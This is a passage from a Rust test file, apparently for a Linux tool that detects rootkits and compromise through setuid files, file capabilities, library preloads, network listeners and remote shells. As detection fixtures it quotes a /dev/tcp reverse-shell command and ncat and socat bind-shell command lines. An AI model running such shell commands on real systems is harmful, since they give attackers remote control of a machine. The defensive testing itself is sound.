        format!("{ONE_MOUNT}40 22 0:40 / /var/tmp/run\u{fffd} rw,nosuid - tmpfs tmpfs rw\n");
    let found = walk_as_root(root, files(100), net_raw_everywhere, &mountinfo);
    let named = odd_named("var/tmp", b"run\xfe");
    assert!(found.items.contains_key(&named), "{:?}", found.items.keys());
}

/// Takes the set-id bits off the file the walk holds, between its listing
/// and its look, as an account's swap would; reads no capabilities.
fn clears_set_id(held: &fs::File) -> std::io::Result<Option<Capabilities>> {
    use std::os::fd::AsRawFd;
    let path = format!("/proc/self/fd/{}", held.as_raw_fd());
    fs::set_permissions(path, fs::Permissions::from_mode(0o755))?;
    Ok(None)
}

#[test]
fn a_set_id_file_swapped_while_it_is_looked_at_is_told_where_accounts_write() {
    let dir = TempDir::new("live-walk-swapped");
    let root = dir.path();
    setuid_file(&root.join("usr/local/r"));
    setuid_file(&root.join("var/tmp/a"));
    fs::set_permissions(root.join("var/tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    let found = walk_as_root(root, files(100), clears_set_id, ONE_MOUNT);
    assert!(found.items.is_empty(), "{:?}", found.items.keys());
    // Only root changes its own places.
    assert_eq!(found.unchecked, Vec::<String>::new());
    assert!(
        found.notes.iter().any(|note| note.ends_with(
            "1 place(s) accounts may write that could not be listed (/var/tmp among them)"
        )),
        "{:?}",
        found.notes
    );
}

#[test]
fn an_entry_gone_meanwhile_is_done_with_only_where_root_alone_names_files() {
    use super::privileged::{Entry, unasked};
    use std::io::{Error, ErrorKind};
    let gone = Error::from(ErrorKind::NotFound);
    assert!(matches!(unasked(&gone, true), Entry::Done));
    // Anywhere else an account may have moved it away while it was looked at.
    assert!(matches!(unasked(&gone, false), Entry::Unknown));
    for kind in [
        ErrorKind::PermissionDenied,
        ErrorKind::InvalidData,
        ErrorKind::Other,
    ] {
        assert!(matches!(unasked(&Error::from(kind), true), Entry::Unknown));
    }
}

/// `capabilities`, read as if they were the host's: a test cannot give a
/// file those without being root.
fn as_hosts(held: &fs::File) -> std::io::Result<Option<Capabilities>> {
    let read = super::capability::capabilities(held)?;
    Ok(read.map(|read| Capabilities { root_id: 0, ..read }))
}

#[test]
fn a_file_with_capabilities_is_found_by_the_walk() {
    use super::capability::capabilities;
    use super::privileged::{Closed, mounts, privileged_walk};
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    let dir = TempDir::new("live-capability-walk");
    let root = dir.path();
    let theirs = root.join("var/tmp");
    fs::create_dir_all(&theirs).unwrap();
    fs::create_dir_all(root.join("usr/local")).unwrap();
    let tool = root.join("usr/local/tool");
    fs::write(&tool, "tool").unwrap();
    let odd = theirs.join(OsStr::from_bytes(b"run\xfe"));
    fs::write(&odd, "program").unwrap();
    let rooted = root
        .join("usr/local")
        .join(OsStr::from_bytes(b"rooted\xfe"));
    fs::write(&rooted, "program").unwrap();
    if ![&tool, &odd, &rooted]
        .iter()
        .all(|path| namespaced_capability(path))
    {
        errln!("skipped: unshare -Ur setcap is not available");
        return;
    }
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o1777)).unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let mut closed = Closed {
        mounts: Some(mounts(ONE_MOUNT)),
        ..Closed::default()
    };
    let mut found = super::Found::default();
    privileged_walk(&scope, &mut found, &mut closed, files(10_000), capabilities);
    assert!(found.items.is_empty(), "{:?}", found.items);
    assert_eq!(found.unchecked, Vec::<String>::new());
    assert!(
        found
            .notes
            .iter()
            .any(|note| note
                .starts_with("3 name(s) of files with capabilities for a user namespace")),
        "{:?}",
        found.notes
    );
    let mut found = super::Found::default();
    privileged_walk(&scope, &mut found, &mut closed, files(10_000), as_hosts);
    // Root's: an item; where only root names files, a name that is not
    // UTF-8 is not checked; anywhere else, the accounts' alert.
    let item = &found.items["usr/local/tool"];
    assert!(
        item.notes
            .iter()
            .any(|note| note.contains("cap_net_raw=ep")),
        "{item:?}"
    );
    assert_eq!(
        found.unchecked,
        ["/usr/local/rooted\\xfe: a name that is not UTF-8 was not checked"]
    );
    let named = odd_named("var/tmp", b"run\xfe");
    assert!(found.of_accounts.contains(&named));
    assert!(found.items[&named].notes[0].contains("a file with capabilities (cap_net_raw=ep"));
    // On a mount where set-id bits have no effect, capabilities have none.
    let mut closed = Closed {
        mounts: Some(mounts(&format!(
            "{ONE_MOUNT}40 22 0:40 / /usr/local rw,nosuid - fuse.x x rw\n"
        ))),
        ..Closed::default()
    };
    let mut found = super::Found::default();
    privileged_walk(&scope, &mut found, &mut closed, files(10_000), as_hosts);
    assert!(!found.items.contains_key("usr/local/tool"));
    assert_eq!(found.unchecked, Vec::<String>::new());
}

#[test]
fn an_account_cannot_make_odd_named_items_without_bound() {
    use super::capability::capabilities;
    use super::privileged::{Closed, mounts, privileged_walk};
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    let dir = TempDir::new("live-walk-odd-bound");
    let root = dir.path();
    let theirs = root.join("var/tmp");
    fs::create_dir_all(&theirs).unwrap();
    for at in 0..1_001 {
        let mut name = format!("s{at}").into_bytes();
        name.push(0xfe);
        let path = theirs.join(OsStr::from_bytes(&name));
        fs::write(&path, "").unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o4755)).unwrap();
    }
    fs::set_permissions(&theirs, fs::Permissions::from_mode(0o1777)).unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let mut closed = Closed {
        mounts: Some(mounts(ONE_MOUNT)),
        ..Closed::default()
    };
    let mut found = super::Found::default();
    privileged_walk(&scope, &mut found, &mut closed, files(10_000), capabilities);
    assert!(
        found
            .notes
            .iter()
            .any(|note| note.starts_with("1 more setuid file(s) or file(s) with capabilities")),
        "{:?}",
        found.notes
    );
}

#[test]
fn a_directory_the_accounts_run_cannot_list_is_a_note() {
    use super::capability::capabilities;
    use super::privileged::{Closed, mounts, privileged_walk};
    let dir = TempDir::new("live-walk-accounts-closed");
    let root = dir.path();
    let spool = root.join("var/spool/mail");
    fs::create_dir_all(spool.join("x")).unwrap();
    fs::set_permissions(spool.join("x"), fs::Permissions::from_mode(0o000)).unwrap();
    fs::set_permissions(&spool, fs::Permissions::from_mode(0o1777)).unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let mut closed = Closed {
        mounts: Some(mounts(ONE_MOUNT)),
        ..Closed::default()
    };
    let mut found = super::Found::default();
    let listable = fs::read_dir(spool.join("x")).is_ok();
    privileged_walk(&scope, &mut found, &mut closed, files(100), capabilities);
    fs::set_permissions(spool.join("x"), fs::Permissions::from_mode(0o700)).unwrap();
    // Run as root, nothing is closed to the test.
    if listable {
        return;
    }
    assert_eq!(found.unchecked, Vec::<String>::new());
    assert!(
        found.notes.iter().any(|note| note.ends_with(
            "1 place(s) accounts may write that could not be listed (/var/spool/mail/x among them)"
        )),
        "{:?}",
        found.notes
    );
}

#[test]
fn a_users_sweep_leaves_an_odd_name_where_only_root_names_files_unchecked() {
    use super::capability::capabilities;
    use super::privileged::{Closed, privileged_walk};
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    let dir = TempDir::new("live-walk-user-odd");
    let root = dir.path();
    fs::create_dir_all(root.join("usr/lib").join(OsStr::from_bytes(b"x\xff"))).unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::System,
    };
    let mut found = super::Found::default();
    privileged_walk(
        &scope,
        &mut found,
        &mut Closed::default(),
        files(100),
        capabilities,
    );
    assert_eq!(
        found.unchecked,
        ["/usr/lib/x\\xff: a name that is not UTF-8 was not checked"]
    );
}

#[test]
fn only_what_does_not_add_up_is_listed() {
    let (dir, index) = fixture();
    let root = dir.path();
    let live = check(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let seen: Vec<(&str, Category, Vec<RuleId>)> = live
        .items
        .iter()
        .map(|item| {
            (
                item.path.as_str(),
                item.category,
                item.alerts.iter().map(|(rule, _)| *rule).collect(),
            )
        })
        .collect();
    assert_eq!(
        seen,
        [
            (
                "home/u/.cache/dropper",
                Category::Process,
                vec![RuleId::RunningFromTemp]
            ),
            (
                "home/u/.evil.so",
                Category::Process,
                vec![RuleId::PreloadedLibrary]
            ),
            (
                "home/u/.local/bin/keylog",
                Category::Input,
                vec![RuleId::KeyboardReader]
            ),
            (
                "home/u/.local/bin/tool",
                Category::Process,
                vec![RuleId::HiddenProgram]
            ),
            ("home/u/server:tcp-8080", Category::Listener, vec![]),
            (
                "home/u/shell",
                Category::Setuid,
                vec![RuleId::UnknownPrivilegedFile]
            ),
            (
                "memfd:payload",
                Category::Process,
                vec![RuleId::HiddenProgram]
            ),
            (
                "sys/module/ghost",
                Category::KernelModule,
                vec![RuleId::UnknownKernelModule]
            ),
            (
                "tmp/gone",
                Category::Process,
                vec![RuleId::HiddenProgram, RuleId::RunningFromTemp]
            ),
            (
                "usr/bin/helper",
                Category::Setuid,
                vec![RuleId::UnknownPrivilegedFile]
            ),
            (
                "usr/bin/python3:tcp-4444",
                Category::Listener,
                vec![RuleId::NetworkListener]
            ),
            (
                "usr/lib/modules/6.1-test/extra/rootkit.ko",
                Category::KernelModule,
                vec![RuleId::UnknownKernelModule]
            ),
        ]
    );
    let server = live
        .items
        .iter()
        .find(|item| item.path == "home/u/server:tcp-8080")
        .unwrap();
    assert!(server.notes[0].contains("TCP port 8080"));
    // The file at the path of a deleted program is not what runs.
    let tool = live
        .items
        .iter()
        .find(|item| item.path == "home/u/.local/bin/tool")
        .unwrap();
    assert!(tool.sha256.is_none());
    assert!(tool.notes[0].contains("the file there now is another one"));
    assert!(live.notes.iter().any(|note| note.contains("out-of-tree")));
}

#[test]
fn modules_wait_for_a_reboot_after_a_kernel_update() {
    let (dir, index) = fixture();
    let root = dir.path();
    // The updated kernel's package no longer has this release.
    fs::remove_file(root.join("usr/lib/modules/6.1-test/pkgbase")).unwrap();
    let live = check(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    assert!(
        !live
            .items
            .iter()
            .any(|item| item.category == Category::KernelModule)
    );
    assert!(
        live.notes
            .iter()
            .any(|note| note.contains("after a reboot"))
    );
}

#[test]
fn a_socket_is_looked_at_for_every_process_that_shares_it() {
    let (dir, index) = fixture();
    let root = dir.path();
    // The program that opened it, and a packaged one it handed it to.
    process(
        root,
        "30",
        "/home/u/server",
        &[("3", "socket:[777]"), ("4", "socket:[777]")],
        "",
    );
    process(
        root,
        "31",
        "/usr/bin/hyprland",
        &[("3", "socket:[777]")],
        "",
    );
    write(
        root,
        "proc/net/tcp",
        "  sl  local_address rem_address   st\n   0: 00000000:2328 00000000:0000 0A 0:0 0:0 0 1000 0 777 1\n",
    );
    let live = check(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let notes: Vec<&String> = live.items.iter().flat_map(|item| &item.notes).collect();
    assert!(
        notes
            .iter()
            .any(|note| note.contains("process 30 ") && note.contains("listens on TCP port 9000")),
        "{notes:?}"
    );
    // The packaged program has no packaged service behind it: it is
    // shown too, as itself.
    let handed = live
        .items
        .iter()
        .find(|item| item.path == "usr/bin/hyprland:tcp-9000")
        .unwrap();
    assert!(handed.notes[0].contains("process 31 "), "{handed:?}");
    assert_eq!(handed.alerts[0].0, RuleId::NetworkListener);
    // A second copy of the socket in one process says nothing twice.
    assert_eq!(
        notes
            .iter()
            .filter(|note| note.contains("process 30 "))
            .count(),
        1,
        "{notes:?}"
    );
}

/// A process as the checks read it.
fn running(exe: &str, arguments: &[&str], cwd: Option<&str>, environment: &str) -> super::Process {
    super::Process {
        pid: "7".into(),
        exe: exe.into(),
        exe_id: None,
        cmdline: arguments.join("\0").into_bytes(),
        environment: Some(environment.replace(';', "\0").into_bytes()),
        cwd: cwd.map(str::to_string),
        cwd_mark: cwd.map(|cwd| super::program::cwd_mark(cwd.as_bytes())),
        ..super::Process::default()
    }
}

/// What the temporary and preload checks say about `process`: each
/// item's path, alerts and notes.
fn said(
    scope: &Scope<'_>,
    process: &super::Process,
    exe: &str,
) -> Vec<(String, Vec<RuleId>, Vec<String>)> {
    let mut found = super::Found::default();
    super::temporary_checks(scope, process, exe, &mut found);
    super::preload_checks(scope, process, exe, &mut found);
    found
        .items
        .into_values()
        .map(|item| {
            (
                item.path,
                item.alerts.iter().map(|(rule, _)| *rule).collect(),
                item.notes,
            )
        })
        .collect()
}

#[test]
fn the_script_is_looked_for_past_an_options_value() {
    // After an option that takes a value in one interpreter and none
    // in another, both readings are looked at; code on the command
    // line names no file.
    let candidates = |arguments: &[&str]| {
        let owned: Vec<String> = arguments
            .iter()
            .map(|argument| (*argument).to_string())
            .collect();
        super::script_arguments(&owned)
            .into_iter()
            .map(str::to_string)
            .collect::<Vec<_>>()
    };
    assert_eq!(
        candidates(&["python3", "-W", "ignore", "/tmp/evil.py", "argument"]),
        ["ignore", "/tmp/evil.py"]
    );
    assert_eq!(
        candidates(&["python3", "-I", "/tmp/evil.py"]),
        ["/tmp/evil.py"]
    );
    assert_eq!(
        candidates(&[
            "ld-linux-x86-64.so.2",
            "--library-path",
            "/tmp",
            "/tmp/evil"
        ]),
        ["/tmp", "/tmp/evil"]
    );
    assert_eq!(candidates(&["bash", "-x", "a.sh", "b.sh"]), ["a.sh"]);
    // `-e`, `-c` and `-m` are plain flags in a shell, and take code or
    // a module elsewhere: what follows is looked at as a file either
    // way, and code names none.
    assert_eq!(candidates(&["bash", "-e", "/tmp/x.sh"]), ["/tmp/x.sh"]);
    assert_eq!(candidates(&["sh", "-c", "/tmp/x"]), ["/tmp/x"]);
    assert_eq!(candidates(&["python3", "-c", "import os"]), ["import os"]);
    assert_eq!(
        candidates(&["python3", "-m", "http.server"]),
        ["http.server"]
    );
}

#[test]
fn what_an_interpreter_or_the_loader_runs_is_what_is_judged() {
    let dir = TempDir::new("live-scripts");
    let root = dir.path();
    for path in ["tmp/evil.py", "tmp/evil", "home/u/work/tool.py"] {
        write(root, path, "x");
    }
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    // A script by a relative name is found where the process runs.
    let relative = running("/usr/bin/python3", &["python3", "evil.py"], Some("tmp"), "");
    assert_eq!(
        super::subject(&scope, &relative, "usr/bin/python3").0,
        "tmp/evil.py"
    );
    let elsewhere = running(
        "/usr/bin/python3",
        &["python3", "evil.py"],
        Some("home/u"),
        "",
    );
    assert_eq!(
        super::subject(&scope, &elsewhere, "usr/bin/python3").0,
        "usr/bin/python3"
    );
    // The loader runs the program it is given.
    let loader = "usr/lib/ld-linux-x86-64.so.2";
    assert!(super::is_interpreter(loader));
    assert!(super::is_interpreter("usr/bin/gawk"));
    assert!(!super::is_interpreter("usr/bin/ldd"));
    let loaded = running(&format!("/{loader}"), &[loader, "/tmp/evil"], None, "");
    assert_eq!(super::subject(&scope, &loaded, loader).0, "tmp/evil");

    // Either one, run from a temporary directory, is said; a script
    // elsewhere is not.
    for (process, exe, script) in [
        (&relative, "usr/bin/python3", "tmp/evil.py"),
        (&loaded, loader, "tmp/evil"),
    ] {
        let found = said(&scope, process, exe);
        assert!(
            matches!(found.as_slice(), [(path, alerts, _)]
                    if path == script && alerts == &[RuleId::RunningFromTemp]),
            "{found:?}"
        );
    }
    // Whichever reading names a file in a temporary directory, it is
    // said: a harmless file given as the "value" hides nothing.
    write(root, "tmp/ignore", "x");
    for arguments in [
        &["python3", "-W", "ignore", "/tmp/evil.py"][..],
        &["python3", "-I", "/tmp/evil.py", "/home/u/work/tool.py"][..],
    ] {
        let process = running("/usr/bin/python3", arguments, Some("tmp"), "");
        let found = said(&scope, &process, "usr/bin/python3");
        assert!(
            found
                .iter()
                .any(|(path, alerts, _)| path == "tmp/evil.py"
                    && alerts == &[RuleId::RunningFromTemp]),
            "{arguments:?} {found:?}"
        );
    }
    // An AppImage's own start script is noted, not flagged.
    write(root, "tmp/.mount_app/AppRun", "x");
    let appimage = running(
        "/usr/bin/bash",
        &["bash", "/tmp/.mount_app/AppRun"],
        None,
        "",
    );
    let found = said(&scope, &appimage, "usr/bin/bash");
    assert!(
        matches!(found.as_slice(), [(path, alerts, _)]
                if path == "tmp/.mount_app/AppRun" && alerts.is_empty()),
        "{found:?}"
    );
    let fine = running(
        "/usr/bin/python3",
        &["python3", "work/tool.py"],
        Some("home/u"),
        "LD_LIBRARY_PATH=/opt/app/lib:/tmp/.mount_app/usr/lib",
    );
    assert!(said(&scope, &fine, "usr/bin/python3").is_empty());
}

#[test]
fn libraries_from_a_temporary_directory_and_audit_libraries_are_said() {
    let dir = TempDir::new("live-libraries");
    let root = dir.path();
    write(root, "home/u/.audit.so", "x");
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let searching = running(
        "/usr/bin/python3",
        &["python3"],
        None,
        "LD_LIBRARY_PATH=/usr/lib:/tmp/libs:lib:;LD_AUDIT=/home/u/.audit.so",
    );
    let found = said(&scope, &searching, "usr/bin/python3");
    let about = |path: &str| found.iter().find(|(found, _, _)| found == path).unwrap();
    let (_, alerts, notes) = about("usr/bin/python3");
    assert_eq!(alerts, &[RuleId::PreloadedLibrary]);
    assert!(
        notes.iter().any(|note| note.contains("in /tmp/libs first")),
        "{notes:?}"
    );
    assert!(
        notes
            .iter()
            .any(|note| note.contains("relative to where it runs first")),
        "{notes:?}"
    );
    assert!(!notes.iter().any(|note| note.contains("in /usr/lib first")));
    // An audit library is loaded into the program like a preload.
    let (_, alerts, _) = about("home/u/.audit.so");
    assert_eq!(alerts, &[RuleId::PreloadedLibrary]);
    assert_eq!(
        super::searched(Some(b"LD_LIBRARY_PATH=/a//b/:rel\0")),
        [Some("a/b".to_string()), None]
    );
    // What every launcher leaves behind says nothing.
    assert!(super::searched(Some(b"LD_LIBRARY_PATH=:$ORIGIN/lib::${LIB}:/\0")).is_empty());
    // A token followed by `..`, or an unknown one, is not one of those.
    assert_eq!(
        super::searched(Some(b"LD_LIBRARY_PATH=$ORIGIN/../../tmp/x:$HOME/lib\0")),
        [None, None]
    );
    let launcher = running(
        "/usr/bin/python3",
        &["python3"],
        None,
        "LD_LIBRARY_PATH=/opt/app/lib:",
    );
    assert!(said(&scope, &launcher, "usr/bin/python3").is_empty());
}

#[test]
fn a_relay_is_named_by_itself_not_by_what_it_runs() {
    let dir = TempDir::new("live-relay");
    let root = dir.path();
    write(root, "usr/bin/bash", "bash");
    write(root, "home/u/server.py", "serve");
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let process = |exe: &str, arguments: &[&str]| super::Process {
        pid: "1".into(),
        exe: exe.into(),
        exe_id: None,
        cmdline: arguments.join("\0").into_bytes(),
        ..super::Process::default()
    };
    let ncat = process(
        "/usr/bin/ncat",
        &["ncat", "-e", "/usr/bin/bash", "-lk", "4444"],
    );
    assert_eq!(
        super::subject(&scope, &ncat, "usr/bin/ncat").0,
        "usr/bin/ncat"
    );
    let python = process("/usr/bin/python3", &["python3", "/home/u/server.py"]);
    assert_eq!(
        super::subject(&scope, &python, "usr/bin/python3").0,
        "home/u/server.py"
    );
}

/// An index in which package `package` installed `files` (path and
/// content).
fn installed_by(index: &mut PackageIndex, package: &str, files: &[(&str, &str)]) {
    let mut mtree = String::from("#mtree\n/set type=file mode=755\n");
    for (path, text) in files {
        writeln!(
            mtree,
            "./{path} sha256digest={}",
            Sha256::digest(text.as_bytes())
        )
        .unwrap();
    }
    index.add_for_test(package, &mtree, &[]);
}

/// A system whose package `core` installed `files`, each as it was
/// installed.
fn system(label: &str, files: &[(&str, &str)]) -> (TempDir, PackageIndex) {
    let dir = TempDir::new(label);
    for (path, text) in files {
        write(dir.path(), path, text);
    }
    let mut index = PackageIndex::with_foreign(HashSet::new());
    installed_by(&mut index, "core", files);
    (dir, index)
}

fn look(root: &Path, index: &PackageIndex, origin: Origin) -> super::Live {
    check(&Scope {
        root,
        home: Some("home/u"),
        index,
        origin,
    })
}

/// One file of a process's `/proc` directory.
fn detail(root: &Path, pid: &str, name: &str, text: &str) {
    write(root, &format!("proc/{pid}/{name}"), text);
}

/// The paths and alerts of what was found, but the trusted items.
fn listed(live: &super::Live) -> Vec<(&str, Vec<RuleId>)> {
    live.items
        .iter()
        .filter(|item| !item.is_trusted())
        .map(|item| {
            (
                item.path.as_str(),
                item.alerts.iter().map(|(rule, _)| *rule).collect(),
            )
        })
        .collect()
}

/// A `/proc/net` table of `sockets`: local and remote end, state and
/// inode.
fn table(root: &Path, name: &str, sockets: &[(&str, &str, &str, &str)]) {
    let mut text = String::from("  sl  local_address rem_address   st\n");
    for (index, (local, remote, state, inode)) in sockets.iter().enumerate() {
        writeln!(
            text,
            "{index:4}: {local} {remote} {state} 0:0 0:0 0 1000 0 {inode} 1"
        )
        .unwrap();
    }
    write(root, &format!("proc/net/{name}"), &text);
}

#[test]
fn capabilities_a_package_does_not_set_are_said_by_how_far_they_go() {
    let rule = |path: &str, clauses: &str| super::unexpected_capabilities(path, &given(clauses));
    assert_eq!(
        given("cap_net_raw,cap_setgid=ep cap_chown=i").names(),
        ["cap_chown", "cap_net_raw", "cap_setgid"]
    );
    assert_eq!(given("=ep").to_string(), "=ep");

    let high = Some(RuleId::UnknownPrivilegedFile);
    let medium = Some(RuleId::UnexpectedCapability);
    assert_eq!(rule("usr/bin/python3", "=ep"), high);
    for capability in [
        "cap_dac_read_search",
        "cap_sys_rawio",
        "cap_setfcap",
        "cap_mknod",
        "cap_bpf",
        "cap_net_admin",
        "cap_sys_chroot",
        "cap_sys_boot",
        "cap_mac_admin",
        "cap_mac_override",
        "cap_linux_immutable",
        "cap_setpcap",
        "cap_setuid",
        // One getcap has no name for.
        "41",
    ] {
        assert_eq!(rule("usr/bin/tar", &format!("{capability}+ep")), high);
    }
    for capability in [
        "cap_net_raw",
        "cap_perfmon",
        "cap_sys_time",
        "cap_audit_control",
        "cap_sys_resource",
        "cap_kill",
        "cap_ipc_owner",
        "cap_net_bind_service",
    ] {
        assert_eq!(rule("usr/bin/tar", &format!("{capability}=ep")), medium);
    }
    // One root-like capability among others decides.
    assert_eq!(rule("usr/bin/tar", "cap_kill,cap_bpf=ep"), high);
    // What a package sets on its own program, and nothing more.
    assert_eq!(rule("usr/bin/newuidmap", "cap_setuid=ep"), None);
    assert_eq!(rule("usr/bin/newuidmap", "cap_setgid,cap_setuid=ep"), high);
    assert_eq!(rule("usr/bin/newgidmap", "cap_setuid=ep"), high);
    assert_eq!(
        rule(
            "usr/lib/gstreamer-1.0/gst-ptp-helper",
            "cap_net_bind_service,cap_net_admin=ep"
        ),
        None
    );
    assert_eq!(rule("usr/bin/rsh", "cap_net_bind_service=ep"), None);
    assert_eq!(
        rule("usr/bin/rsh", "cap_net_bind_service,cap_kill=ep"),
        medium
    );
    for (path, expected) in super::EXPECTED_CAPABILITIES {
        assert!(expected.is_sorted(), "{path}");
        assert!(
            expected
                .iter()
                .all(|name| super::ROOT_CAPABILITIES.contains(name)
                    || super::OTHER_CAPABILITIES.contains(name)),
            "{path}"
        );
    }
}

#[test]
fn a_packaged_file_with_capabilities_of_its_own_is_listed() {
    let (dir, index) = system(
        "live-capabilities",
        &[("usr/bin/python3", "python"), ("usr/bin/ping", "ping")],
    );
    let scope = Scope {
        root: dir.path(),
        home: None,
        index: &index,
        origin: Origin::System,
    };
    let mut found = super::Found::default();
    for (path, capabilities) in [
        ("usr/bin/python3", "=ep"),
        ("usr/bin/ping", "cap_net_raw=ep"),
    ] {
        let looked = crate::sweep::collect::look(&scope, Category::Setuid, path, None);
        super::privileged(
            &scope,
            &mut found,
            path,
            &looked,
            &format!("capabilities {capabilities}"),
            Some(&given(capabilities)),
        );
    }
    let items: Vec<&crate::sweep::collect::Item> = found.items.values().collect();
    assert_eq!(items.len(), 1, "{items:?}");
    assert_eq!(items[0].path, "usr/bin/python3");
    assert_eq!(items[0].alerts[0].0, RuleId::UnknownPrivilegedFile);
    assert!(items[0].notes[0].contains("capabilities =ep"));
    assert!(!items[0].is_trusted());
}

#[test]
fn a_shell_or_interpreter_on_a_connection_is_a_remote_shell() {
    let unit = "usr/lib/systemd/system/handler@.service";
    let (dir, index) = system(
        "live-remote-shell",
        &[
            ("usr/bin/bash", "bash"),
            ("usr/bin/python3", "python"),
            ("usr/bin/sleep", "sleep"),
            (
                unit,
                "[Service]\nExecStart=-/usr/bin/python3 -u /usr/lib/handler\nStandardInput=socket\n",
            ),
        ],
    );
    let root = dir.path();
    let stdio = |inode: &str| -> Vec<(String, String)> {
        ["0", "1", "2"]
            .iter()
            .map(|fd| ((*fd).to_string(), format!("socket:[{inode}]")))
            .collect()
    };
    let on = |pid: &str, exe: &str, fds: &[(String, String)]| {
        let fds: Vec<(&str, &str)> = fds
            .iter()
            .map(|(fd, target)| (fd.as_str(), target.as_str()))
            .collect();
        process(root, pid, exe, &fds, "");
    };
    // `bash -i >& /dev/tcp/203.0.113.5/443 0>&1`.
    on("10", "/usr/bin/bash", &stdio("500"));
    // What every service has: output on a local socket (the journal).
    on("11", "/usr/bin/python3", &stdio("600"));
    on("12", "/usr/bin/bash", &stdio("600"));
    // A shell at a terminal that opened `/dev/tcp` on descriptor 3.
    process(
        root,
        "13",
        "/usr/bin/bash",
        &[("0", "/dev/pts/1"), ("3", "socket:[501]")],
        "",
    );
    // An interpreter something on this machine drives.
    on("14", "/usr/bin/python3", &stdio("502"));
    // A packaged service started per connection: its program is not
    // said, a shell started that way is.
    let group = "0::/system.slice/system-handler.slice/handler@7.service\n";
    on("15", "/usr/bin/python3", &stdio("503"));
    detail(root, "15", "cgroup", group);
    on("16", "/usr/bin/bash", &stdio("504"));
    detail(root, "16", "cgroup", group);
    // A program that runs nothing it is told, and an interpreter with
    // a connection that is not its input: a client.
    on("17", "/usr/bin/sleep", &stdio("505"));
    process(
        root,
        "18",
        "/usr/bin/python3",
        &[("0", "/dev/pts/2"), ("7", "socket:[506]")],
        "",
    );
    let here = "0200A8C0:D431";
    table(
        root,
        "tcp",
        &[
            (here, "057100CB:01BB", "01", "500"),
            (here, "076433C6:115C", "01", "501"),
            ("0100007F:D432", "0100007F:1F90", "01", "502"),
            (here, "097100CB:C001", "01", "503"),
            (here, "097100CB:C002", "01", "504"),
            (here, "057100CB:0050", "01", "505"),
            (here, "057100CB:0050", "01", "506"),
        ],
    );
    let live = look(root, &index, Origin::System);
    assert_eq!(
        listed(&live),
        [
            ("usr/bin/bash:to-198.51.100.7", vec![RuleId::RemoteShell]),
            ("usr/bin/bash:to-203.0.113.5", vec![RuleId::RemoteShell]),
            ("usr/bin/bash:to-203.0.113.9", vec![RuleId::RemoteShell]),
            ("usr/bin/python3:to-127.0.0.1", vec![RuleId::NetworkRelay]),
        ]
    );
    let shell = live
        .items
        .iter()
        .find(|item| item.path == "usr/bin/bash:to-203.0.113.5")
        .unwrap();
    assert!(
        shell.notes[0].contains("has its input or output on a connection to 203.0.113.5 port 443"),
        "{:?}",
        shell.notes
    );
    // The item is the shell's file, under the name of what it does.
    assert_eq!(shell.sha256, Some(Sha256::digest(b"bash")));
}

#[test]
fn addresses_are_shown_as_they_are_written() {
    use super::net::shown;
    assert_eq!(shown("0100007F"), "127.0.0.1");
    assert_eq!(shown("057100CB"), "203.0.113.5");
    assert_eq!(shown("00000000000000000000000001000000"), "::1");
    assert_eq!(shown("0000000000000000FFFF0000057100CB"), "203.0.113.5");
    assert_eq!(shown("B80D0120000000000000000001000000"), "2001:db8::1");
    assert!(is_loopback("0000000000000000FFFF00000100007F"));
}

/// The listeners of `listeners_are_named_by_what_they_are`.
fn listening_processes(root: &Path) {
    let session = "0::/user.slice/user-1000.slice/session-1.scope\n";
    let start = |pid: &str, exe: &str, inode: &str, group: &str, arguments: &str| {
        let socket = format!("socket:[{inode}]");
        process(root, pid, exe, &[("0", "/dev/null"), ("3", &socket)], "");
        detail(root, pid, "cgroup", group);
        detail(root, pid, "cmdline", &arguments.replace(' ', "\0"));
    };
    start(
        "20",
        "/usr/bin/sshd",
        "700",
        "0::/system.slice/sshd.service\n",
        "sshd: /usr/bin/sshd -D [listener]",
    );
    start(
        "21",
        "/usr/bin/sshd",
        "701",
        session,
        "/usr/bin/sshd -f /tmp/cfg -p 2222",
    );
    start(
        "22",
        "/usr/bin/socat",
        "702",
        session,
        "socat TCP-LISTEN:4444,fork EXEC:bash",
    );
    start("23", "/usr/bin/nginx", "703", session, "nginx");
    let own = "0::/user.slice/user-1000.slice/user@1000.service/app.slice/mpd.service\n";
    start("24", "/usr/bin/mpd", "704", own, "/usr/bin/mpd --systemd");
    // Moved into that group by its user: the unit does not start it.
    start("25", "/usr/bin/nginx", "705", own, "nginx");
    start(
        "26",
        "/usr/bin/python3",
        "706",
        session,
        "python3 -m http.server 8000",
    );
    start(
        "27",
        "/usr/bin/python3",
        "707",
        session,
        "python3 -m http.server 0",
    );
    start(
        "28",
        "/usr/bin/python3",
        "708",
        session,
        "python3 -m other 8000",
    );
    start("29", "/home/u/tool", "709", session, "tool");
    for (fd, inode) in [("4", "710"), ("5", "711")] {
        symlink(
            format!("socket:[{inode}]"),
            root.join("proc/29/fd").join(fd),
        )
        .unwrap();
    }
}

/// A system with listeners of every kind (see `listening_processes`).
fn listening_system() -> (TempDir, PackageIndex) {
    let (dir, index) = system(
        "live-listeners",
        &[
